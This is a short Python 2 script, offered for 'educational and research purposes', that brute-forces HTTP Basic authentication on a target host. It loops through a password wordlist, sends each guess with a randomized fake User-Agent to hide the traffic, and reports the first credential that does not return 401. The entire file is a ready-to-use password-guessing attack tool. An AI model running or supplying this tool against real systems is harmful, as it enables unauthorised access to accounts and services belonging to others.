#!/usr/bin/python
#/*
# * ----------------------------------------------------------------------------
# * "THE BEER-WARE LICENSE" (Revision 42):
# * @dustyfresh wrote this file. As long as you retain this notice you
# * can do whatever you want with this stuff. If we meet some day, and you think
# * this stuff is worth it, you can buy me a beer in return Poul-Henning Kamp
# * ----------------------------------------------------------------------------
# * DISCLAIMER:
# * 	This is for educational and research purposes only. I am not responsible 
# * 	for your use of this script or the modification of this script. Don't be
# *	a jerk.
# *
# * BTC: https://www.coinbase.com/cia
# * Twitter: @dustyfresh
# */
import sys, datetime, requests
from requests.auth import HTTPBasicAuth
from fake_useragent import UserAgent

try:
        user = sys.argv[1]
except:
        print "Oh noes! You forgot to specify a user.\nEx: " + sys.argv[0] + " admin http://127.0.0.1/ ./list.txt"
        sys.exit(0)
try:
        host = sys.argv[2]
except:
        print "Oh noes! You forgot to specify a host.\nEx: " + sys.argv[0] + " admin http://127.0.0.1/ ./list.txt"
        sys.exit(0)
try:
        listfile = sys.argv[3]
except:
        print "Oh noes! You forgot to specify a listfile.\nEx: " + sys.argv[0] + " admin http://127.0.0.1/ ./list.txt"
        sys.exit(0)

dictionary = open(listfile)
list = dictionary.readlines()
words = [ ]
print "Initializing dictionary\n",
for entry in list:
    newword = entry.rstrip("\n")
    words.append(newword)
print "Dictionary initialized"
print "Now testing\n"

for password in words:
    ua = UserAgent().random
    headers = { "User-Agent" : ua }
    authinfo = { "user": user, "pass": password }
    r = requests.get(host, headers=headers, auth=(authinfo['user'], authinfo['pass']))
    req = r.status_code
    if req != 401:
        print "\nSuccess! " + user + ":" + password
        print "Completed test at ",
        print datetime.datetime.now()
        sys.exit()
    else:
        print "...."

print "Attack unsuccessful...Completed at ",
print datetime.datetime.now()
